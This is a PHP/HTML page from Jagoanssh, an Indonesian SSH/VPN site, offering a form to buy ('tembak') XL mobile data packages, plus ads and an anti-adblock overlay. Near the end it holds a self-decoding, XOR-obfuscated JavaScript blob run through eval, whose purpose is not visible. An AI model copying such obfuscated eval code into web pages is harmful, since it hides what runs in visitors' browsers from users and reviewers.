<?php 
include_once 'tembak.php';

if (empty($_SESSION['session'])){
    Header("Location:Login.php");
    session_destroy();
}
if ($_SESSION['indexx'] != 00){
    Header("Location:Login.php");
    $_SESSION['session'] = '';
    session_destroy();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#6078ea">
	<meta name="msapplication-navbutton-color" content="#6078ea">
	<meta name="apple-mobile-web-app-status-bar-style" content="#6078ea">
    <title>Tembak Paket XL - Jagoanssh</title>
    <meta name="description" content="Jagoanssh - Tembak Paket XL Murah"/>
    <meta name="keywords" content="Jagoanssh, Jagoanssh.com, Web SSH, Website SSH, Free VPN Account, Free SSH Account, Fast SSH, Free Openvpn Account, Full Speed SSH, Fast SSH VPN, SSH Stunnel, SSH SSL, SSH Indonesia ,SSH Server SGGS, SSH Server Singapore, Free SSH Server, Fast SSH Account, SSH 30 Days, SSH 7 Days, SSH 3 Days, Free Internet, Best SSH VPN, Best SSH Account, SSH VIP, SSH Tunneling, Fast VPN Account, Dropbear, OpenSSH, Free Shadowsocks Account, Proxy Squid, SSH 60 Days, Shadowsocks VPN, Free Wireguard Account, Wireguard VPN, Virtual Private Servers, SSH Lifetime, SSH SGDO, SSH Gaming, SSH Gratis, Unlimited SSH, Virtual Private Network, Tembak Paket Data, Tembak Xl, Tembak Telkomsel, Tembak Axis, Internet Gratis">
	<meta name="google-site-verification" content="vhYyF0q_9LSeZtClRFcSLJ7M-FDrEu-DpPZIPS69WbY" />
	<link rel="icon" href="https://jagoanssh.com/favicon.png">
	
<!-- Google Analytics -->
<script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-120286388-2', 'auto');
      ga('send', 'pageview');
</script>
   <!-- End Google Analytics -->
    
    <link href="https://fonts.googleapis.com/css?family=Rubik:300,400,500" rel="stylesheet"> 
    <link rel="stylesheet" href="scss/css/styles-merged.css">
    <link rel="stylesheet" href="scss/css/style.min.css">
    <script src="/assets/js/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
    <link href="scss/lib/lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="scss/lib/css/style.css" rel="stylesheet">
    <link href="scss/lib/lib/font-awesome/css/font-awesome.min.css" rel="stylesheet">
    
<script>
$(document).ready(function(){

        $("#beli").click(function(event){
            event.preventDefault();
            var reg =jQuery('select[name="reg"]').val(),
                manual=jQuery('input[name="manual"]').val();
            $.ajax({
                type:'POST',
                url:'tembak.php',
                data:{
                    reg:reg,manual:manual
                },
                error:function(xhr,ajaxOptions,thrownError){
                    $('#response').html(xhr);
                },
                cache:false,
                beforeSend:function(){
                    $(".form-control").attr("disabled", true);
                    $('#response').html("<img src='/assets/img/ajax-loader.gif' />");

                },
                success:function(s){
                    $(".form-control").attr("disabled", false);
                    $('#response').html(s);
                }
            });
            return false;
        });
        $.get('count.php').done(function(data){
            $('#count').html('Total Transaksi: '+data);
        });
    });
</script>
    
<?php
include('ads/auto.php');
?>
</head>
  <body>
   <header id="header">
    <div class="container">
      <div class="logo float-left">
      <a href="/" class="scrollto"><img src="/logo.png"></a>
      </div>
      <nav class="main-nav float-right d-none d-lg-block">
        <ul>
          <li><a href="/">Home</a></li>
          <li class="drop-down"><a href="#">SSH Server</a>
          <ul>
          <li><a href="/?do=ssh-servers">SSH 3 Days</a></li>
          <li><a href="/?do=ssh-servers&filter=extra">SSH 7 Days</a></li>
          <li><a href="/?do=ssh-servers&filter=one-month">SSH 30 Days <span class="btn-danger scrollto">VIP</span></a></li>
          </ul>
          </li>
          <li class="drop-down"><a href="#">VPN Server</a>
          <ul>
          <li><a href="/?do=vpn-servers">Openvpn</a></li>
          <li><a href="/?do=shadowsocks">Shadowsocks</a></li>
          <li><a href="/?do=wireguard">Wireguard VPN <span class="btn-danger scrollto">New</span></a></li>
          </ul>
          </li>
          <li class="drop-down"><a href="#">Tools</a>
          <ul>
          <li><a href="/?do=squid">Squid Proxy</a></li>
          <li><a href="/?do=host-to-ip">Host To IP</a></li>
          <li><a href="/?do=ssh-lifetime">SSH Lifetime</a></li>
          <li><a href="/?do=check-account">Check Account</a></li>
          <li><a href="/?do=server-status">Server Status</a></li>
          <li><a href="/?do=whatismyip">Whats Is My IP</a></li>
          <li><a href="https://linkconfig.com">Linkconfig.com</a></li>
          </ul>
          </li>
          <li class="drop-down"><a href="#">Paket Data</a>
          <ul>
          <li><a href="/?do=axis">Axis</a></li>
          <li><a href="/?do=xl">XL</a></li>
          <li><a href="/?do=indosat">Indosat</a></li>
          <li><a href="/?do=telkom">Telkomsel</a></li>
          </ul>
          </li>
          <li><a href="#"><i class="fa fa-history"></i> Resset Time: 22:00 GMT +7</a></li>
        </ul>
      </nav>
      
    </div>
  </header>
   <section id="intro" class="clearfix">
    <div class="container d-flex h-100">
      <div class="row justify-content-center align-self-center">
        <div class="col-md-6 intro-info order-md-first order-last wow fadeInUp">
          <h2>Free SSH VPN Accounts</h2>
          <div>
          </div>
        </div>
  
        <div class="col-md-6 intro-img order-md-last order-first wow fadeInLeft">
          <img src="/negara/home.png" alt="" class="img-fluid">
        </div>
      </div>

    </div>
  </section>


   <section id="services" class="probootstrap-section probootstrap-feature-first">
    <div class="container">
      <div class="row" style="margin-top: -120px;">

          <div class="col-md-6 col-lg-4 wow bounceInUp" data-wow-duration="1.4s">
            <div class="box">
              <div class="icon" style="background: #fceef3;"><i class="icon-lock3" style="color: #ff689b;"></i></div>
              <h4 class="title">Privacy & Security</h4>
              <p class="description">Get your identity hidden online, your IP Address will be masked with our server IP. Also your connection will be encrypted.</p>
            </div>
          </div>
          <div class="col-md-6 col-lg-4 wow bounceInUp" data-wow-duration="1.4s">
            <div class="box">
              <div class="icon" style="background: #fff0da;"><i class="icon-shield3" style="color: #e98e06;"></i></div>
              <h4 class="title">Bypass Cencorship</h4>
              <p class="description">Bypass your school, government or your office internet cencorship. Unblock any site and enjoy Internet Freedom.</p>
            </div>
          </div>

          <div class="col-md-6 col-lg-4 wow bounceInUp" data-wow-delay="0.1s" data-wow-duration="1.4s">
            <div class="box">
              <div class="icon" style="background: #e6fdfc;"><i class="icon-speedometer" style="color: #3fcdc7;"></i></div>
              <h4 class="title">Boost Internet Speed</h4>
              <p class="description">Our service may boost your internet speed and make your connection stable (stable PING). This differ by country.</p>
            </div>
          </div>
        </div>
      </div>
<?php
include('ads/ads.php');
?>
    </section>
    
<!-- START: section -->
  <section class="probootstrap-section probootstrap-section-colored">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2 class="title">Kenapa Harus Tembak Paket XL?</h2>
          <p class="lead">Beberapa keuntungan dengan membeli paket data di website ini</p>
        </div>
      </div>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-wallet"></i> <span>Harga Lebih Murah</span></h3>
          <p>Harga lebih murah dan kami menyediakan banyak pilihan paket diskon</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-credit-card"></i> <span>System Pembayaran</span></h3>
          <p>Semua pembelian paket data langsung memotong pulsa dari pengguna</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-key"></i> <span>System Keamanan</span></h3>
          <p>Website ini tidak pernah menyimpan semua data pengguna yang melakukan pembelian paket data</p>
        </div>
        <div class="clearfix visible-md-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-checkmark"></i> <span>Pembelian Legal</span></h3>
          <p>Semua pembelian paket data di jamin legal karena langsung di beli dari pihak XL</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-hour-glass2"></i> <span>Beli Kapan Saja</span></h3>
          <p>Anda bisa membeli paket data kapan saja selama system kami online</p>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
          <h3 class="heading-with-icon"><i class="icon-users2"></i> <span>Kirim Paket</span></h3>
          <p>Anda bisa membeli paket data untuk teman atau pun keluarga anda</p>
        </div>
        <div class="clearfix visible-sm-block"></div>
      </div>
    </div>
   </div>
  </section>
  <!-- END: section -->
<section class="probootstrap-section">
    <div class="container">
    <div class="row">
    <div class="col-md-8 col-md-offset-2 section-heading">
    <p class="text-center probootstrap-animate">
    <span class="badge badge-success mb-3 p-3">Free SSH Accounts</span>
    <span class="badge badge-info mb-3 p-3">Free VPN Accounts</span>
    <span class="badge badge-warning mb-3 p-3">Unlimited Bandwidth</span>
    <span class="badge badge-primary mb-3 p-3">Full Speed SSH</span>
    <span class="badge badge-success mb-3 p-3">SSH SSL Accounts</span>
    <span class="badge badge-primary mb-3 p-3">Fast SSH Servers</span>
    <span class="badge badge-info mb-3 p-3">Fast VPN Servers</span>
  </div>
  </div>
  </div>
</section>
<?php
include('ads/link.php');
?>
<section class="probootstrap-section">
    <div class="container">
    <div class="row">
    <div class="col-md-6 col-md-offset-3 probootstrap-animate">
    <form method="post" class="probootstrap-form probootstrap-box">
    <center>
<div class="icon"><i class="icon-checkbox-checked"></i></div>
<h1>Tembak XL</h1></center>
    <form method="post">
        <div class="form-group">
            <label>Manual ID (jika tidak punya biarkan kosong)</label>
            <input type="number" class="form-control" id="inputmanual" name="manual">
        </div>
        <?php
        (isset($_POST["anuID"])) ? $anuID = $_POST["anuID"] : $anuID=1;
        ?>
        <div class="form-group">
			<label>Pilih Paket</label>
			<select class="form-control" name="reg">
				<option <?php if ($anuID == 1 ) echo 'selected' ; ?> value="1">XTRA Kuota 30GB, 30hr, Rp 11.900</option>
				<option <?php if ($anuID == 2 ) echo 'selected' ; ?> value="2">XTRA Kuota PUBG 10GB, 30hr, Rp 10.000</option>
				<option <?php if ($anuID == 22 ) echo 'selected' ; ?> value="22">XTRA Kuota Waze 10 GB 30hr, Rp 10.000</option>
				<option <?php if ($anuID == 25 ) echo 'selected' ; ?> value="25">XTRA Kuota Midnight 5GB, 30hr, Rp 10.000</option>
				<option <?php if ($anuID == 26 ) echo 'selected' ; ?> value="26">XTRA Kuota Youtube 2GB, 30hr, Rp 10.000</option>
				<option <?php if ($anuID == 27 ) echo 'selected' ; ?> value="27">XTRA Kuota Facebook 2GB, 30hr, Rp 10.00</option>
				<option <?php if ($anuID == 28 ) echo 'selected' ; ?> value="28">XTRA Kuota Joox 10GB, 30hr, Rp 10.00</option>
				<option <?php if ($anuID == 29 ) echo 'selected' ; ?> value="29">XTRA Kuota Mobile Legends 10GB, 30hr, Rp10.000</option>
				<option>#### XTRA UNLIMITED TURBO ####</option>
                <option <?php if ($anuID == 3 ) echo 'selected' ; ?> value="3">XTRA Unlimited Turbo Joox, Rp 10.000</option>
                <option <?php if ($anuID == 4 ) echo 'selected' ; ?> value="4">XTRA Unlimited Turbo Basic, Rp 10.000</option>
                <option <?php if ($anuID == 6 ) echo 'selected' ; ?> value="6">XTRA Unlimited Turbo Standart, Rp 20.000</option>
                <option <?php if ($anuID == 5 ) echo 'selected' ; ?> value="5">XTRA Unlimited Turbo VIU, Rp 25.000</option>
                <option <?php if ($anuID == 7 ) echo 'selected' ; ?> value="7">XTRA Unlimited Turbo Youtube, Rp 25.000</option>
                <option <?php if ($anuID == 8 ) echo 'selected' ; ?> value="8">XTRA Unlimited Turbo Tiktok, Rp 25.000</option>
                <option <?php if ($anuID == 9 ) echo 'selected' ; ?> value="9">XTRA Unlimited Turbo Netflix, Rp 25.000</option>
                <option <?php if ($anuID == 10 ) echo 'selected' ; ?> value="10">XTRA Unlimited Turbo Super, Rp 30.000</option>
                <option <?php if ($anuID == 11 ) echo 'selected' ; ?> value="11">XTRA Unlimited Turbo Premium, Rp 50.000</option>
                <!---<option <?php if ($anuID == 12 ) echo 'selected' ; ?> value="12">HotRod 30 Hari 1.5GB, 30hr, Rp25rb</option>--->
                <!---<option <?php if ($anuID == 13 ) echo 'selected' ; ?> value="13">HotRod 30 Hari 3GB, 30hr, Rp30rb</option>
                <!---<option <?php if ($anuID == 14 ) echo 'selected' ; ?> value="14">HotRod 30 Hari 6GB, 30hr, Rp50rb</option>--->
                <option>#### XTRA COMBO LITE ####</option>
                <!---<option <?php if ($anuID == 61 ) echo 'selected' ; ?> value="61">XTRA Combo Lite 2GB + 1GB, 30hr, Rp 20.000</option>--->
                <option <?php if ($anuID == 62 ) echo 'selected' ; ?> value="62">XTRA Combo Lite 3.5GB + 1.5GB + 1GB, 30hr, Rp 33.000</option>
                <option <?php if ($anuID == 63 ) echo 'selected' ; ?> value="63">XTRA Combo Lite 6GB + 2GB + 3GB, 30hr, Rp 45.000</option>
                <option <?php if ($anuID == 64 ) echo 'selected' ; ?> value="64">XTRA Combo Lite 11GB + 4GB + 6GB, 30hr, Rp 65.000</option>
                <option <?php if ($anuID == 65 ) echo 'selected' ; ?> value="65">XTRA Combo Lite 21GB + 4GB + 12GB, 30hr, Rp 105.000</option>
                <option <?php if ($anuID == 66 ) echo 'selected' ; ?> value="66">XTRA Combo Lite 31GB + 6GB + 18GB, 30hr, Rp 125.000</option>
                <!---<option <?php if ($anuID == 15 ) echo 'selected' ; ?> value="15">Combo Lite 3GB, 30hr, Rp19.900</option>--->
                <!---<option <?php if ($anuID == 16 ) echo 'selected' ; ?> value="16">Combo Lite 5GB, 30hr, Rp29.900</option>--->
                <!---<option<?php if ($anuID == 17 ) echo 'selected' ; ?> value="17">Combo Lite 9GB, 30hr, Rp49.900</option>--->
                <!---<option <?php if ($anuID == 18 ) echo 'selected' ; ?> value="18">Combo Lite 17GB, 30hr, Rp79.900</option>--->
              <!--- <option <?php if ($anuID == 19 ) echo 'selected' ; ?> value="19">Combo Lite 25GB, 30hr, Rp99.900</option>--->
                <!---<option <?php if ($anuID == 20 ) echo 'selected' ; ?> value="20">Super Seru, 30hr, Rp15rb</option>--->
                <option <?php if ($anuID == 30 ) echo 'selected' ; ?> value="30">Waze&Chat 1 hr, Rp 500</option>
                <option <?php if ($anuID == 23 ) echo 'selected' ; ?> value="23">Waze&Chat 3 hr, Rp 1000</option>
             <option <?php if ($anuID == 24 ) echo 'selected' ; ?> value="24">Waze&Chat 7hr, Rp 2500</option>
             <option <?php if ($anuID == 31 ) echo 'selected' ; ?> value="31">Xtra Rejeki 7hr, Rp 10.000</option>
             <option <?php if ($anuID == 32 ) echo 'selected' ; ?> value="32">Xtra Rejeki 14hr, Rp 20.000</option>
             <option <?php if ($anuID == 33 ) echo 'selected' ; ?> value="33">Xtra Rejeki 30hr, Rp 65.000</option>
             <option <?php if ($anuID == 34 ) echo 'selected' ; ?> value="34">Unlimited FB&Chat 1hr sahur, Rp 500</option>
             <option <?php if ($anuID == 35 ) echo 'selected' ; ?> value="35">Unlimited FB&Chat 3hr sahur, Rp 1000</option>
             <option <?php if ($anuID == 36 ) echo 'selected' ; ?> value="36">Unlimited FB&Chat 7hr sahur, Rp 2500</option>
             <option <?php if ($anuID == 37 ) echo 'selected' ; ?> value="37">Unlimited FB&Chat 1hr ngabuburit, Rp 500</option>
             <option <?php if ($anuID == 38 ) echo 'selected' ; ?> value="38">Unlimited FB&Chat 3hr ngabuburit, Rp 1000</option>
             <option <?php if ($anuID == 39 ) echo 'selected' ; ?> value="39">Unlimited FB&Chat 7hr ngabuburit, Rp 2500</option>
             <option <?php if ($anuID == 48 ) echo 'selected' ; ?> value="48">Zero JOOX 500mb 10 hari, Rp. 0</option>
             <option <?php if ($anuID == 49 ) echo 'selected' ; ?> value="49">Zero AOV 500mb 10 hari, Rp.0</option>
             <option <?php if ($anuID == 50 ) echo 'selected' ; ?> value="50">Zero Smule 500mb 10 hari, Rp0</option>
             <option <?php if ($anuID == 51 ) echo 'selected' ; ?> value="51">Zero Google Duo 50mb 1 hari, Rp.0</option>
             <option <?php if ($anuID == 52 ) echo 'selected' ; ?> value="52">Zero tokopedia 50mb 1 hari, Rp.0</option>
             <!---<option <?php if ($anuID == 40 ) echo 'selected' ; ?> value="40">VIP CLUB Joox 10GB, 30hr, Rp. 1000</option>--->
             <!---<option <?php if ($anuID == 41 ) echo 'selected' ; ?> value="41">VIP CLUB Facebook 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 42 ) echo 'selected' ; ?> value="42">VIP CLUB iFlix 5GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 43 ) echo 'selected' ; ?> value="43">VIP CLUB Instagram 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 44 ) echo 'selected' ; ?> value="44">VIP CLUB Mobile Legends 10GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 45 ) echo 'selected' ; ?> value="45">VIP CLUB Waze 10GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 46 ) echo 'selected' ; ?> value="46">VIP CLUB Youtube 2GB, 30hr, Rp. 1000</option>
             <option <?php if ($anuID == 47 ) echo 'selected' ; ?> value="47">VIP CLUB Midnight 5GB, 30hr, Rp. 1000</option>--->
                <!---<option <?php if ($anuID == 2 ) echo 'selected' ; ?> value="2">Pkt XTRA Combo 5GB + 5GB, 30hr, Rp59000</option>--->
             <option>#### XTRA COMBO ####</option>
             <option <?php if ($anuID == 53 ) echo 'selected' ; ?> value="53">XTRA Combo 5GB + 5GB, 30hr, Rp 54.000</option>
             <option <?php if ($anuID == 54 ) echo 'selected' ; ?> value="54">XTRA Combo 10GB + 10GB, 30hr, Rp 81.000</option>
             <option <?php if ($anuID == 55 ) echo 'selected' ; ?> value="55">XTRA Combo 15GB + 15GB, 30hr, Rp 114.000</option>
             <option <?php if ($anuID == 56 ) echo 'selected' ; ?> value="56">XTRA Combo 20GB + 20GB, 30hr, Rp 159.000</option>
             <option>#### XTRA COMBO VIP ####</option>
             <option <?php if ($anuID == 57 ) echo 'selected' ; ?> value="57">XTRA Combo VIP 5GB + 5GB, 30hr, Rp 62.000</option>
             <option <?php if ($anuID == 58 ) echo 'selected' ; ?> value="58">XTRA Combo VIP 10GB + 10GB, 30hr, Rp 89.000</option>
             <option <?php if ($anuID == 59 ) echo 'selected' ; ?> value="59">XTRA Combo VIP 15GB + 15GB, 30hr, Rp 120.000</option>
             <option <?php if ($anuID == 60 ) echo 'selected' ; ?> value="60">XTRA Combo VIP 20GB + 20GB, 30hr, Rp 164.000</option>
             <option <?php if ($anuID == 67 ) echo 'selected' ; ?> value="67">BONUS KUOTA 2GB, 7hr, Rp 0</option>
             <option <?php if ($anuID == 68 ) echo 'selected' ; ?> value="68">XTRA Gift Telp&SMS, 1hr, Rp 0</option>
             <option <?php if ($anuID == 69 ) echo 'selected' ; ?> value="69">XTRA Gift 100mb, 1hr, Rp 0</option>
             <option <?php if ($anuID == 70 ) echo 'selected' ; ?> value="70">XTRA Combo Gift 1GB + 1GBYT + Unli YT 01-06, 30hr, Rp 25.000</option>
             <option <?php if ($anuID == 71 ) echo 'selected' ; ?> value="71">XTRA Combo Gift 2GB + 2GBYT + Unli YT 01-06, 30hr, Rp 35.000</option>
             <option <?php if ($anuID == 72 ) echo 'selected' ; ?> value="72">XTRA Gift 1GB, 1hr, Rp 0</option>
			</select>
		</div>
		<div align="center">
        <button class="btn btn-info btn-block" input type="button" onclick="window.location = 'clear.php';"> Keluar</button>
        <button class="btn btn-warning btn-block" input type="button" onclick="window.location = 'biz.php';"> Paket BIZ</button>
        <button class="btn btn-primary btn-block" input type="submit" id="beli" name="beli">Beli Paket</button>
        <p><div id="response"></div></p>
<?php
include('ads/ads.php');
?>
<div id="count">
</form>
</div>
</div>
</div>
</section>

<style>#g207{position:fixed!important;position:absolute;top:0;top:expression
        ((t=document.documentElement.scrollTop?document.documentElement.scrollTop:document
        .body.scrollTop)+"px");
        left:0;width:100%;height:100%;background-color:#fff;opacity:0.9;filter:alpha(opacity=90);display:block}#g207 p{opacity:1;filter:none;font:bold 16px Verdana,Arial,sans-serif;text-align:center;margin:20% 0}#g207 p a,#g207 p i{font-size:12px}#g207 ~ *{display:none}</style><noscript><i id=g207><p>Welcome To JAGOANSSH.COM<br />Get Your Account SSH / VPN Premium<br />High Speed<br />Creat Now<br /><a href="http://antiblock.org/">antiblock.org</a></p></i></noscript><script>(function(w,u){var d=w.document,z=typeof u;function g207(){function c(c,i){var e=d.createElement('i'),b=d.body,s=b.style,l=b.childNodes.length;if(typeof i!=z){e.setAttribute('id',i);s.margin=s.padding=0;s.height='100%';l=Math.floor(Math.random()*l)+1}e.innerHTML=c;b.insertBefore(e,b.childNodes[l-1])}function g(i,t){return !t?d.getElementById(i):d.getElementsByTagName(t)};function f(v){if(!g('g207')){c('<p><font color="blue">PESAN DARI ADMIN JAGOSSH.COM</font><br/><font color="red">Mohon matikan ads block di browser anda agar suport dengan website ini.... </font><p>Please disable your ad blocker!<br/>This site is supported by the advertisement <br/>Please disable your ad blocker to support us!!! </p>','g207')}};(function(){var a=['Adrectangle','PageLeaderAd','ad-column','advertising2','divAdBox','mochila-column-right-ad-300x250-1','searchAdSenseBox','ad','ads','adsense'],l=a.length,i,s='',e;for(i=0;i<l;i++){if(!g(a[i])){s+='<a id="'+a[i]+'"></a>'}}c(s);l=a.length;for(i=0;i<l;i++){e=g(a[i]);if(e.offsetParent==null||(w.getComputedStyle?d.defaultView.getComputedStyle(e,null).getPropertyValue('display'):e.currentStyle.display
        )=='none'){return f('#'+a[i])}}}());(function(){var t=g(0,'img'),a=['/adaffiliate_','/adops/ad','/adsales/ad','/adsby.','/adtest.','/ajax/ads/ad','/controller/ads/ad','/pageads/ad','/weather/ads/ad','-728x90-'],i;if(typeof t[0]!=z&&typeof t[0].src!=z){i=new Image();i.onload=function(){this.onload=z;this.onerror=function(){f(this.src)};this.src=t[0].src+'#'+a.join('')};i.src=t[0].src}}());(function(){var o={'http://pagead2.googlesyndication.com/pagead/show_ads.js':'google_ad_client','http://js.adscale.de/getads.js':'adscale_slot_id','http://get.mirando.de/mirando.js':'adPlaceId'},S=g(0,'script'),l=S.length-1,n,r,i,v,s;d.write=null;for(i=l;i>=0;--i){s=S[i];if(typeof o[s.src]!=z){n=d.createElement('script');n.type='text/javascript';n.src=s.src;v=o[s.src];w[v]=u;r=S[0];n.onload=n.onreadystatechange=function(){if(typeof w[v]==z&&(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")){n.onload=n.onreadystatechange=null;r.parentNode.removeChild(n);w[v]=null}};r.parentNode.insertBefore(n,r);setTimeout(function(){if(w[v]!==null){f(n.src)}},2000);break}}}())}if(d.addEventListener){w.addEventListener('load',g207,false)}else{w.attachEvent('onload',g207)}})(window);</script>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script src="//yourjavascript.com/4682124575/antibomklik.js"/></script>        

<!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
          <h2>Benefits of using SSH/VPN</h2>
          <p class="lead">Here are some advantages of using SSH or VPN.</p>
        </div>
      </div>
<?php
include('ads/ads.php');
?>
      <div class="row">
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
            <div class="probootstrap-box">
          <h3 class="mb30">In secret (confidentiality)</h3>
          <p>By using a public network that controls data, SSH / VPN technology uses a work system by encrypting all data that passes through it.</p>
          <p>With the encryption technology, data confidentiality can be more controlled.</p>
          <p>Although there are parties who can tap data that passes over the internet in addition to the SSH / VPN line itself, but not necessarily able to read the data, because the data has been scrambled.</p>
          <p>By implementing this encryption system, no one can access and read the data network contents easily.</p>
        </div>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
        <div class="probootstrap-box">
          <h3 class="mb30">Integrity Data (Data Integrity)</h3>
          <p>When passing through the internet network, the data actually runs very far past various countries.</p>
          <p>During the trip, various disturbances could occur in its contents, lost, damaged, manipulated by people who could not be moved.</p>
          <p>In SSH / VPN technology is needed that can maintain the integrity of the data starting from the data sent until the data reaches the destination.</p>
        </div>
        </div>
        <div class="col-md-4 col-sm-6 col-xs-12 probootstrap-animate">
        <div class="probootstrap-box">
          <h3 class="mb30">Source Authentication (Authentication Origin)</h3>
          <p>SSH / VPN technology has the ability to authenticate sending data sources to be received. SSH / VPN will check all incoming data and retrieve information from the data source.</p>
          <p>Then, the address of the data source will be successfully completed, the authentication process was successful.</p>
          <p>Thus, SSH / VPN guarantees all data sent and received from the source received. No data is falsified or sent by other parties.</p>
        </div>
      </div>
    </div>
  </section>
  <!-- END: section -->
  
  <!-- START: footer -->
  <footer role="contentinfo" class="probootstrap-footer">
    <div class="container">
      <div class="row mt40">
        <div class="col-md-12 text-center">
          <ul class="probootstrap-footer-social">
            <li><a href="#"><i class="icon-twitter"></i></a></li>
            <li><a href="https://facebook.com/jagoanssh"><i class="icon-facebook"></i></a></li>
            <li><a href="#"><i class="icon-instagram2"></i></a></li>
          </ul>
          <a href="/?do=terms">Terms & Condition</a> | <a href="/?do=privacy">Privacy Policy</a>
          <p>
            <small>&copy; <?php echo $date = date('Y'); ?> <a href="https://jagoanssh.com/" target="_blank">Jagoanssh.com</a>. All Rights Reserved.</small>
          </p>
          
        </div>
      </div>
    </div>
  </footer>
  <!-- END: footer -->
    <!-- Placed at the end of the document so the pages load faster -->
    <?php include('ads/cookie.php'); ?>
    
    <script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",l=x.length;for(i=l-1;i>=0;i--) {try{o+=x.c" +
"harAt(i);}catch(e){}}return o;}f(\")\\\"function f(x,y){var i,o=\\\"\\\\\\\""+
"\\\\,l=x.length;for(i=0;i<l;i++){if(i<88)y++;y%=127;o+=String.fromCharCode(" +
"x.charCodeAt(i)^(y++));}return o;}f(\\\"\\\\=4>*\\\\\\\\014\\\\\\\\006\\\\\\"+
"\\013\\\\\\\\023G\\\\\\\\034\\\\\\\\037\\\\\\\\006\\\\\\\\005\\\\\\\\026\\\\"+
"\\\\031\\\\\\\\031QYAsavox~,}bq)J:i\\\\\\\\177mS\\\\\\\\rNU\\\\\\\\007YO\\\\"+
"\\\\\\\\\\\\YB@E\\\\\\\\026WUPn(7\\\\\\\\032jtpa#1&?(.b\\\\\\\\002\\\\\\\\0" +
"22>\\\\\\\\nFHJLR\\\\\\\\003\\\\\\\\021\\\\\\\\006\\\\\\\\037\\\\\\\\010\\\\"+
"\\\\016\\\\\\\\\\\\\\\\\\\\\\\\rs`8[+yh\\\\\\\\177~!ec>\\\\\\\\177r}{8zqw4q" +
"oA<!\\\\\\\\034\\\\\\\\016Q@VLVS\\\\\\\\026uXwB\\\\\\\\r\\\\\\\\016\\\\\\\\" +
"017\\\\\\\\020\\\\\\\\rAPF\\\\\\\\\\\\\\\\FC\\\\\\\\030JHX\\\\\\\\001a\\\\\\"+
"\\034^32'77j,4g#;>)?7a6> >z8?9v3)\\\\\\\\007~cbp\\\\\\\\023\\\\\\\\002\\\\\\"+
"\\020\\\\\\\\n\\\\\\\\024\\\\\\\\021X;\\\\\\\\0325\\\\\\\\004KLMNS\\\\\\\\0" +
"03\\\\\\\\022\\\\\\\\000\\\\\\\\032\\\\\\\\004\\\\\\\\001V\\\\\\\\004\\\\\\" +
"\\n\\\\\\\\032G'^\\\\\\\\034\\\\\\\\rsdvp+ou(iyz%ad`!zbN1*)9d{kskh#<6\\\\\\" +
"\\033\\\\\\\\021\\\\\\\\031\\\"\\\\,88)\\\"(f};)lo,0(rtsbus.o nruter};)i(tA" +
"rahc.x=+o{)--i;0=>i;1-l=i(rof}}{)e(hctac};l=+l;x=+x{yrt{)711=!)31/l(tAedoCr" +
"ahc.x(elihw;lo=l,htgnel.x=lo,\\\"\\\"=o,i rav{)x(f noitcnuf\")"              ;
while(x=eval(x));
//-->
//]]>
</script>
<script type="text/javascript">
<!--
document.write(unescape('%3c%73%63%72%69%70%74%20%73%72%63%3d%22%73%63%73%73%2f%6c%69%62%2f%6c%69%62%2f%6d%6f%62%69%6c%65%2d%6e%61%76%2f%6d%6f%62%69%6c%65%2d%6e%61%76%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%73%63%72%69%70%74%20%73%72%63%3d%22%73%63%73%73%2f%6c%69%62%2f%6c%69%62%2f%77%6f%77%2f%77%6f%77%2e%6d%69%6e%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%73%63%72%69%70%74%20%73%72%63%3d%22%73%63%73%73%2f%6c%69%62%2f%6c%69%62%2f%77%61%79%70%6f%69%6e%74%73%2f%77%61%79%70%6f%69%6e%74%73%2e%6d%69%6e%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%73%63%72%69%70%74%20%73%72%63%3d%22%73%63%73%73%2f%6c%69%62%2f%6a%73%2f%6d%61%69%6e%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e'));
//-->
</script>

  </body>
</html>